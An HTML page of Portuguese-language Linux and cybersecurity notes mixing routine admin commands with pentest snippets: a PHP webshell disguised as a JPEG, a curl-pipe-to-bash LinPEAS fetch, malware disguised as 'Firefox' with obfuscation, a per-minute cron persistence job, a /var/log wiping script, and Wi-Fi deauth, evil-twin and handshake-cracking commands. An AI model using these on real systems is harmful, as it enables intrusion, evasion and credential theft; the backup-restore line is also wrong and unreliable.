<!DOCTYPE html>
<html lang="pt-BR">

<!-- Cabeçalho -->

<head>
    <title>Linux Notes</title>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description"
        content="Notes de Segurança Cibernética - Resposta a Incidentes, Pentesting e Defesa de Sistemas">

    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;700&display=swap" rel="stylesheet">
    <link href="css/styles.css" rel="stylesheet" />

    <!-- Scripts -->
    <script src="js/scripts.js"></script>
    <script src="https://use.fontawesome.com/releases/v6.3.0/js/all.js" crossorigin="anonymous"></script>
</head>

<body>
    <div class="main-container">
        <div class="menu-hamburguer" onclick="toggleMenu()" style="position: fixed; cursor: pointer;">
            <span class="bar"></span>
            <span class="bar"></span>
            <span class="bar"></span>
        </div>
    </div>

    <!-- Barra Lateral -->
    <aside class="sidebar" style="left: -250px; overflow-y: auto;">
        <br><br>
        <nav>
            <ul>
                <li><a href="#about" class="js-scroll-trigger">Sobre</a></li>
                <li><a href="#notes-title" class="js-scroll-trigger">Notes</a></li>
                <li><a href="https://maarckz.github.io" target="_blank">Maarckz</a></li>
                <li><a href="https://maarckz.github.io/Playbooks">Playbooks</a></li>
                <li><a href="https://maarckz.github.io/CyberDefense/" target="_blank">CyberDefense</a></li>
                <li><a href="https://github.com/Maarckz" target="_blank">GitHub</a></li>
            </ul>
        </nav>
    </aside>

    <!-- Sobre -->
    <section id="about" class="container">
        <h2>Linux & CyberSecurity Notes</h2>
        <p style="text-shadow: 0 4px 16px rgba(0, 0, 0, 0.8);">Este site foi criado para facilitar a busca por comandos
            e dicas essenciais de Linux, especialmente voltados para profissionais de segurança cibernética e
            administradores de servidores. Aqui você encontrará uma coleção de comandos úteis, scripts e boas práticas
            para otimizar seu fluxo de trabalho e garantir a segurança dos seus sistemas.</p>

        <h2>Quer sugerir algum comando? Pode chamar!</h2>
        <div class="social-icons slide-up">
            <a href="https://www.linkedin.com/in/marcus-dealmeida" target="_blank" class="social-icon">
                <i class='fab fa-linkedin slide-up' style='font-size:48px'></i>
            </a>
            <a href="https://github.com/Maarckz" target="_blank" class="social-icon">
                <i class='fab fa-github slide-up' style='font-size:48px'></i>
            </a>
            <a href="https://www.instagram.com/Maarckz" target="_blank" class="social-icon">
                <i class='fab fa-instagram slide-up' style='font-size:48px'></i>
            </a>
            <a href="https://maarckz.github.io/Playbooks" target="_blank" class="social-icon">
                <i class='fas fa-shield-alt slide-up' style='font-size:48px'></i>
            </a>
            <a href="https://maarckz.github.io/CyberDefense/" target="_blank" class="social-icon">
                <i class='fas fa-exclamation-triangle slide-up' style='font-size:48px;color:#ff0000'></i>
            </a>
        </div>
        <br>


        <div class="alert-box"
            style="background-color: #353535;border: 1px solid red;border-radius: 15px;padding: 0.5rem;">
            <div class="alert">
                <span class="material-symbols-outlined"
                    style="margin-left: 1rem;font-size: 1.5rem; color: red; vertical-align: middle;">Atenção!</span>
                <p style="display: inline-block; margin-left: 1rem;margin-top: 0px">Os comandos e scripts fornecidos
                    aqui são exemplos gerais. Sempre adapte-os ao ambiente específico da sua organização e teste-os
                    antes de usar em produção.</p>
            </div>
        </div>
    </section>
    <br>

    <!-- notes -->
    <section id="notes" class="container">
        <h2>Hardening</h2>
        <br>
        <div class="note-list" id="notes-title">
            <!-- note 1 -->
            <div class="note-card">
                <h3>SSH</h3>
                <button onclick="showModal('ssh')">Ver Detalhes</button>
            </div>


            <!-- note 2 -->
            <div class="note-card">
                <h3>Linux</h3>
                <button onclick="showModal('linux')">Ver Detalhes</button>
            </div>


            <!-- note 4 -->
            <div class="note-card">
                <h3>Firewall</h3>
                <button onclick="showModal('firewall')">Ver Detalhes</button>
            </div>

    </section>
    <br>

    <!-- notes -->
    <section id="commands" class="container">
        <h2>Comandos & Anotações</h2>
        <br>
        <div class="note-list2" id="notes-title">
            <!-- note 1 -->
            <div class="note-card2">
                <h1>Comandos Úteis</h1>
                <p><strong>Consultar comandos - </strong><a href="https://explainshell.com/"
                        target="_blank">https://explainshell.com/</a></p>
                <p><strong>Remover KeySensitive - </strong>echo set completion-ignore-case on | sudo tee -a /etc/inputrc
                </p>
                <p><strong>Uso de disco - </strong>df -h</p>
                <p><strong>Uso de memória - </strong>free -m</p>
                <p><strong>Uso de CPU - </strong>top</p>
                <p><strong>Verificar processos - </strong>ps axjf</p>
                <p><strong>Verificar versão do Kernel - </strong>uname -a</p>
                <p><strong>Verificar versão do SO - </strong>cat /etc/*-release</p>
                <p><strong>Listar comandos disponiveis - </strong>apropos ''</p>
                <p><strong>Listar "arquivos" abertos - </strong>lsof</p>
                <p><strong>Rastrear Chamadas do Sistema - </strong>strace</p>
                <p><strong>Rastrear Chamadas de Bibliotecas - </strong>ltrace</p>
            </div>

            <!-- note 1 -->
            <div class="note-card2">
                <h1>Criação de usuário</h1>
                <p><strong>Adicionar usuário com restrições:</strong></p>
                <p>sudo useradd --badname -m -s /bin/rbash usuario</p>
                <p>sudo passwd usuario</p>
                <br>
                <p><strong>Para alterar o SHELL:</strong></p>
                <p>sudo usermod --shell /bin/bash usuario</p>
            </div>

            <!-- note 1 -->
            <div class="note-card2">
                <h1>Criar e Restaurar Backups</h1>
                <p><strong>BKP de diretório - </strong>sudo tar -cvpzf /caminho/para/backup_home.tar.gz -C /home</p>
                <p><strong>Restaurar BKP - </strong>sudo tar -cvpzf /caminho/para/backup_home.tar.gz -C
                    /home/seu_usuario</p>
            </div>

            <!-- note 1 -->
            <div class="note-card2">
                <h1>Configuração de Rede</h1>
                <p><strong>Verificar Interfaces/IPs - </strong>ip -br a</p>
                <p><strong>"Subir" interface de rede - </strong>sudo ip link set eth0 up</p>
                <p><strong>"Derrubar" interface de rede - </strong>sudo ip link set eth0 down</p>
                <p><strong>Renomear interface de rede - </strong>sudo ip link set eth0 name eth1</p>
                <p><strong>Verificar endereço IP da interface - </strong>ip addr show eth0</p>
                <p><strong>Configurar endereço IP estático - </strong>sudo ip addr add 192.168.1.100/24 dev eth0</p>
                <p><strong>Remover endereço IP - </strong>sudo ip addr del 192.168.1.100/24 dev eth0</p>
                <p><strong>Adicionar rota padrão - </strong>sudo ip route add default via 192.168.1.1</p>
                <p><strong>Verificar tabela de roteamento - </strong>ip route show</p>
                <p><strong>Testar conectividade (ping) - </strong>ping google.com</p>
                <p><strong>Liberar e renovar IP (DHCP) - </strong>sudo dhclient -r eth0 && sudo dhclient eth0</p>
                <p><strong>Verificar status da interface - </strong>ip link show eth0</p>
                <p><strong>Habilitar/Desabilitar IPv6 - </strong>sudo sysctl -w net.ipv6.conf.eth0.disable_ipv6=1</p>
                <p><strong>Verificar tráfego de rede - </strong>sudo iftop -i eth0</p>
                <p><strong>Configurar DNS temporário - </strong>sudo echo "nameserver 8.8.8.8" > /etc/resolv.conf</p>
                <p><strong>Verificar resolução DNS - </strong>nslookup google.com</p>
                <p><strong>Verificar velocidade da interface - </strong>ethtool eth0</p>
                <p><strong>Configurar MTU da interface - </strong>sudo ip link set eth0 mtu 1500</p>
                <p><strong>Monitorar tráfego de rede em tempo real - </strong>sudo tcpdump -i eth0</p>
                <p><strong>Observar conexões ativas - </strong>ss -tulnp</p>
                <br>
                <p><strong>Descoberta de Rede (ARP) - - </strong>sudo netdiscover</p>
                <p><strong>Verificar Tabela Arp - - </strong>cat /proc/net/arp


            </div>


            <!-- note 1 -->
            <div class="note-card2">
                <h1>Manipulação de Serviços</h1>
                <p><strong>Listar Serviços - </strong>sudo systemctl list-unit-files</p>
                <p><strong>Habilitar Serviço - </strong>sudo systemctl enable (nome do serviço)</p>
                <p><strong>Desabilitar Serviço - </strong>sudo systemctl disable (nome do serviço)</p>
                <p><strong>Status do Serviço - </strong>sudo systemctl status (nome do serviço)</p>
                <p><strong>Iniciar Serviço - </strong>sudo systemctl start (nome do serviço)</p>
                <p><strong>Parar Serviço - </strong>sudo systemctl stop (nome do serviço)</p>
                <p><strong>Reiniciar Serviço - </strong>sudo systemctl restart (nome do serviço)</p>
                <p><strong>Recarregar Serviços - </strong>sudo systemctl daemon-reload</p>
                <p><strong>Diretórios comuns dos Serviços - </strong>/lib, /etc e /run : /systemd/system/</p>
            </div>

            <!-- note 1 -->
            <div class="note-card2">
                <h1>Baixar Sites</h1>
                <p><strong>Com WGET - </strong>wget --mirror --convert-links --adjust-extension --page-requisites
                    https://URL</p>
            </div>


            <!-- note 1 -->
            <div class="note-card2">
                <h1>Dados de Conexão</h1>
                <p><strong>IP Externo - </strong>curl ifconfig.me</p>
            </div>

            <!-- note 1 -->
            <div class="note-card2">
                <h1>PHP</h1>
                <p><strong>Camuflar WebShellPHP em Imagem:</strong></p>
                <p>echo -e "\xFF\xD8\xFF\xE0" > image.php</p>
                <p>echo -n '&lt;?php $p = file_get_contents("/etc/natas_webpass/natas14"); echo $p; ?&gt;' >> image.php
                </p>
                <p><strong>Verificar o arquivo</strong></p>
                <p>file image.php</p>
                <p><strong>Deve retornar o seguinte:</strong></p>
                <p>image.php: JPEG image data</p>
            </div>

            <!-- note 1 -->
            <div class="note-card2">
                <h1>Enumeração</h1>
                <p><strong>LinPeas - </strong>curl -L
                    https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash</p>
            </div>

            <!-- note 1 -->
            <div class="note-card2">
                <h1>Estabilizar Conexão</h1>
                <p><strong>Reverse Shell - </strong> <a href="https://www.revshells.com/"
                        target="_blank">https://www.revshells.com/</a></p>
            </div>

            <!-- note 1 -->
            <div class="note-card2">
                <h1>Maware</h1>
                <p><strong>PyArmor - </strong>pyarmor -q gen gunkey.py</p>
                <p><strong>PyInstaller - </strong>pyinstaller -n Firefox -F gunkey.py</p>
                <p><strong>PyArmor with Obfuscation - </strong>pyarmor gen -O obfdist --pack dist/Firefox gunkey.py</p>
            </div>
        </div>


        <!-- note 1 -->
        <div class="note-card2">
            <h1>Permissões com Find</h1>
            <p>find / -type f \( -name usuario1 -o -name usuario2 \) -exec ls -ladb {} \; 2>/dev/null</p>
            <p>find / -name root.txt -exec ls -lda {} \; 2>/dev/null</p>
            <p>find / -user root -perm -4000 -exec ls -ladb {} \; 2>/dev/null</p>
            <p>find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \; 2>/dev/null</p>
            <p>find / -type f -perm -u=s -user des -ls 2>/dev/null</p>
            <p>find / -type f -name "*.bak" 2>/dev/null</p>
            <p>find / -perm -u=s -type f 2>/dev/null</p>
        </div>


        <!-- note 1 -->
        <div class="note-card2">
            <h1>CRON</h1>
            <p><strong>O arquivo crontab tem cinco campos de tempo seguidos pelo comando a ser executado:</strong></p>
            <pre style="color: white;">
    ┌──────── min (0 - 59)
    │ ┌───────── hora (0 - 23)
    │ │ ┌────────── dia do mês (1 - 31)
    │ │ │ ┌─────────── mês (1 - 12)
    │ │ │ │ ┌──────────── dia da semana (0 - 6)
    │ │ │ │ │                                  
    │ │ │ │ │                                  
    │ │ │ │ │
    * * * * * comando a ser executado
            </pre>
            <p><strong>Agendar uma tarefa para ser executada a cada minuto:</strong></p>
            <p><code>echo "*/1 * * * * /usr/bin/python3 /home/kali/Documentos/gun.py" | crontab -</code></p>
        </div>


        <!-- note 1 -->
        <div class="note-card2">
            <h1>John The Ripper</h1>
            <p>reRun JOHN > delete 'john.pot'</p>
            <p>unshadow passwd shcat adow > passwords.txt</p>
            <p>john --show</p>
        </div>

        <!-- note 1 -->
        <div class="note-card2">
            <h1>AWK</h1>
            <p><strong>Imprimir número da linha e conteúdo - </strong> awk '{print NR,$0}' file.txt</p>
            <p><strong>Imprimir primeira e terceira coluna - </strong> awk '{print $1, $3}' file.txt</p>
            <p><strong>Usar cat e awk para imprimir primeira e terceira coluna - </strong> cat logfile | awk '{print $1, $3}'</p>
            <p><strong>Substituir 'espaço' por ':' - </strong> awk 'BEGIN{FS=" "; OFS=":"} {print $1,$4}' awk.txt</p>
            <p><strong>Coluna em linhas separado por vírgula - </strong> awk 'BEGIN{ORS=", "}{print $1}' awk.txt</p>
        </div>

        <!-- note 2 -->
        <div class="note-card2">
            <h1>Formatação "ligada"</h1>
            <p><strong>Formatar disco para ext4:</strong></p>
            <p>sudo mkfs.ext4 /dev/sdX</p>
            <p><strong>Shred disco:</strong></p>
            <p>sudo shred -n 1 -v /dev/sdX</p>
        </div>

        <!-- note 3 -->
        <div class="note-card2">
            <h1>Limpeza de Logs</h1>
            <p><strong>Script para limpar logs:</strong></p>
            <pre style="color: white;">
    #! /bin/sh
    cd /var/log
    for l in `ls -p|grep '/'`; do
    echo -n >$l &>/dev/null
    echo Zerando arquivo $l...
    done
    echo Limpeza de log concluída!
            </pre>
        </div>

        <!-- note 1 -->
        <div class="note-card2">
            <h1>Expandir LVM</h1>
            <p><strong>Verificar se o novo disco esta disponivél</strong></p>
            <p>lsblk</p>
            <p>fdisk -l</p>
            <br>
            <p><strong>Criar um Physical Volume (PV)</strong></p>
            <p>sudo pvcreate /dev/sdb</p>
            <p>sudo pvdisplay</p>
            <p><strong>Identifique o VG que seu LVM está usando:</strong></p>
            <p>sudo vgdisplay</p>
            <br>
            <p><strong>Suponha que seu VG se chame vg_root. Agora, adicione o novo PV ao VG:</strong></p>
            <p>sudo vgextend vg_root /dev/sdb</p>
            <br>
            <p><strong>Confirme se o disco foi adicionado:</strong></p>
            <p>sudo vgdisplay</p>
            <br>
            <p><strong>Liste os LVs disponíveis:</strong></p>
            <p>sudo lvdisplay</p>
            <br>
            <p><strong>Identifique o LV que deseja expandir (exemplo: /dev/vg_root/lv_root) e aumente o tamanho
                    dele:</strong></p>
            <p>sudo lvextend -l +100%FREE /dev/vg_root/lv_root</p>
            <br>
            <p><strong>Se o sistema de arquivos for ext4, use:</strong></p>
            <p>sudo resize2fs /dev/vg_root/lv_root</p>
            <br>
            <p><strong>Se for XFS, use:</strong></p>
            <p>sudo xfs_growfs /dev/vg_root/lv_root</p>
            <br>
            <p><strong>Verifique se o espaço foi expandido:</strong></p>
            <p>df -h</p>
        </div>

        <!-- note 1 -->
        <div class="note-card2">
            <h1>Wifi Hacking</h1>
            <p>hcxdumptool -o dump.pcapng -i wlan0 --enable_status=1</p>
            <p>hcxpcaptool -z test.16800 test.pcapng</p>
            <p>hashcat -m 16800 test.16800 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
                -a 0</p>
            <p>hashcat -m 16800 test.16800 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
                -a 0 -w 3</p>
            <p>sudo airmon-ng wlan0 &lt;channel&gt;</p>
            <p>sudo iwconfig wlp4s0mon channel 1</p>
            <p>sudo aireplay-ng --deauth 200 -a 00:31:92:AF:52:B6 wlan0</p>
            <p>bettercap -T 192.168.0.100 --interface at0 --no-spoofing --no-discovery --proxy --proxy-port 80
                --proxy-https --proxy-https-port 443 -P POST</p>
            <p>sudo wifiphisher -nD -i wlan0</p>
            <p>sudo wifite --bully --kill</p>

        </div>

        <!-- note 1 -->
        <div class="note-card2">
            <h1>Geração de Wordlists:</h1>
            <p>cewl -d 2 -m 5 -w passwords.txt http://10.10.145.228 --with-numbers</p>
            <p>cewl -d 0 -m 5 -w usernames.txt http://MACHINE_IP/team.php --lowercase</p>
            <p>crunch 3 3 0123456789ABCDEF -o 3digits.txt</p>
            <p>crunch 3 3 -f /usr/share/crunch/charset.lst mixalpha-numeric-all-space -o 3digits.txt</p>

        </div>

        <!-- note 1 -->
        <div class="note-card2">
            <h1>Python Env 2.7 e 3.x</h1>
            <p>mkdir novo_projeto && cd novo_projeto</p>
            <p><strong>Python2.7 - </strong>python2.7 -m virtualenv venv</p>
            <p><strong>Python3.x - </strong>python3 -m venv venv</p>
            <p><strong>Habilitar o Env - </strong>source venv/bin/activate</p>
            <p><strong>Desabilitar o Env - </strong>deactivate</p>
            <p><strong>Instalar Libs - </strong>pip install -r requirements.txt</p>
            <p><strong>Exportar Libs - </strong>pip freeze > requirements.txt</p>
        </div>


    </section>

    <!-- Modal -->
    <div id="modal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal()">&times;</span>
            <h2 id="modal-title"></h2>
            <div id="modal-details">
                <!-- Conteúdo do modal será injetado aqui -->
            </div>
        </div>
    </div>
    </div>

    <style>
        /* Estilo geral do modal */
        .modal {
            display: none;
            /* Escondido por padrão */
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            /* Fundo semitransparente */
            animation: fadeIn 0.4s ease-in-out;
        }

        /* Animação de entrada */
        @keyframes fadeIn {
            from {
                opacity: 0;
            }

            to {
                opacity: 1;
            }
        }

        /* Animação de saída */
        @keyframes fadeOut {
            from {
                opacity: 1;
            }

            to {
                opacity: 0;
            }
        }

        /* Conteúdo do modal */
        .modal-content {
            position: relative;
            margin: 5% auto;
            padding: 20px;
            background: #2e2e2e;
            color: azure;
            border-radius: 10px;
            max-width: 1400px;
            /* Largura máxima */
            width: 90%;
            /* Adapta ao tamanho da tela */
            top: -5%;
            /* Desloca para cima */
            max-height: 85vh;
            /* Altura máxima para caber na tela */
            overflow-y: auto;
            /* Adiciona barra de rolagem vertical */
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            animation: fadeInUp 0.4s ease-in-out;
        }

        /* Animação de entrada do conteúdo */
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(10px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* Botão de fechar */
        .modal-content .close {
            position: absolute;
            top: 10px;
            right: 15px;
            font-size: 1.5rem;
            font-weight: bold;
            color: rgb(204, 204, 204);
            cursor: pointer;
            transition: color 0.3s;
        }

        .modal-content .close:hover {
            color: red;
        }

        /* Animação de saída do conteúdo ao fechar */
        .modal-content.closing {
            animation: fadeOut 0.4s ease-in-out;
        }
    </style>


</body>

</html>